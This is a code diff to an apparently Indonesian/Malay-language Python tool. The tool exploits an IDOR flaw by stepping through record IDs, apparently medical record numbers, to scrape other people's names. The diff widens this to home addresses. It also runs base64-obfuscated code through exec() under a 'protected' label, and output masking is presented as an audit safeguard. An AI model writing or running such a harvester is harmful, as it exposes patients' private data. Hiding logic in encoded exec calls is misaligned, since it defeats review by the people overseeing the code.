@@ -101,7 +101,7 @@ def fetch_data(id_num):
 
         # Protected extraction and masking logic
         # Logic: BeautifulSoup parse, check tag text-success, mask name (2 front, 2 back), print result with 2 digits RM masking.
-        exec(_decode("c291cCA9IEJlYXV0aWZ1bFNvdXAocmVzLnRleHQsICdodG1sLnBhcnNlcicpCnRhZyA9IHNvdXAuZmluZCgncCcsIGNsYXNzXz0nc2FsZS1wcmljZSB0ZXh0LXN1Y2Nlc3MnKQppZiB0YWc6CiAgICBuYW1hID0gdGFnLmdldF90ZXh0KHN0cmlwPVRydWUpCiAgICBtYXNrID0gZid7bmFtYVs6Ml0udXBwZXIoKX0uLntuYW1hWy0yOl0udXBwZXIoKX0nCiAgICBwcmludChmJ1xuW1wwMzNbOTJtK1wwMzNbMG1dIERhdGEgZGl0ZW11a2FuIFJNOioqKioqKioqe2Zvcm1hdHRlZF9pZFstMjpdfSAtIHttYXNrfScp"))
+        exec(_decode("c291cCA9IEJlYXV0aWZ1bFNvdXAocmVzLnRleHQsICdodG1sLnBhcnNlcicpCnRhZyA9IHNvdXAuZmluZCgncCcsIGNsYXNzXz0nc2FsZS1wcmljZSB0ZXh0LXN1Y2Nlc3MnKQppZiB0YWc6CiAgICBuYW1hID0gdGFnLmdldF90ZXh0KHN0cmlwPVRydWUpCiAgICBtYXNrID0gZid7bmFtYVs6M10udXBwZXIoKX0uLi57bmFtYVstMzpdLnVwcGVyKCl9JyBpZiBsZW4obmFtYSkgPiA2IGVsc2UgbmFtYQogICAgcHJpbnQoZidcbltcMDMzWzkybStcMDMzWzBtXSBEYXRhIGRpdGVtdWthbiBSTToqKioqKioqe2Zvcm1hdHRlZF9pZFstNDpdfSAtIHttYXNrfScp"))
 
     except Exception as e:
         pass # Diamkan error koneksi kecil agar terminal tetap bersih
@@ -195,19 +195,30 @@ def parameter_discovery_audit():
                     test_res = session.get(test_url, timeout=10)
                     test_soup = BeautifulSoup(test_res.text, 'html.parser')
                     
-                    # Masking 3 digit terakhir untuk hasil test (Contoh: *****013)
+                    # Masking No RM untuk hasil audit
                     result_mask = "*" * (len(test_id) - 3) + test_id[-3:]
                     
                     name_tag = test_soup.find('p', class_='sale-price text-success')
-                
-                    if name_tag:
-                        name = name_tag.get_text(strip=True)
-                        # Masking nama: 2 huruf depan, 2 huruf belakang
-                        masked_name = f"{name[:2].upper()}..{name[-2:].upper()}"
+                    address = "Tidak Ditemukan"
+                    
+                    # Ekstraksi Alamat dari detail tag
+                    details = test_soup.find_all('p', class_='detail')
+                    for p in details:
+                        if "Alamat" in p.get_text():
+                            address = p.get_text().split(":")[-1].strip()
+                            break
+
+                    if name_tag or address != "Tidak Ditemukan":
+                        name = name_tag.get_text(strip=True) if name_tag else "Unknown"
+                        # Masking 3 depan ... 3 belakang
+                        m_name = f"{name[:3].upper()}...{name[-3:].upper()}" if len(name) > 6 else name
+                        m_addr = f"{address[:3].upper()}...{address[-3:].upper()}" if len(address) > 6 else address
+
                         print(f"\n[\033[92m✓\033[0m] Manipulation Test Result: \033[92mSUCCESS\033[0m")
-                        print(f" [!] Manipulated ID : {result_mask}")
-                        print(f" [!] Discovered Data: {masked_name}")
-                        print(f" [!] Vulnerability  : \033[91mIDOR Confirmed\033[0m")
+                        print(f" [!] Manipulated ID  : {result_mask}")
+                        print(f" [!] Discovered Name: {m_name}")
+                        print(f" [!] Discovered Addr: {m_addr}")
+                        print(f" [!] Vulnerability   : \033[91mIDOR Confirmed\033[0m")
                     else:
                         print(f"\n[\033[93m!\033[0m] Manipulation Test Completed for ID {result_mask}.")
                         print(f" [!] Result         : No data extracted (Status: {test_res.status_code})")
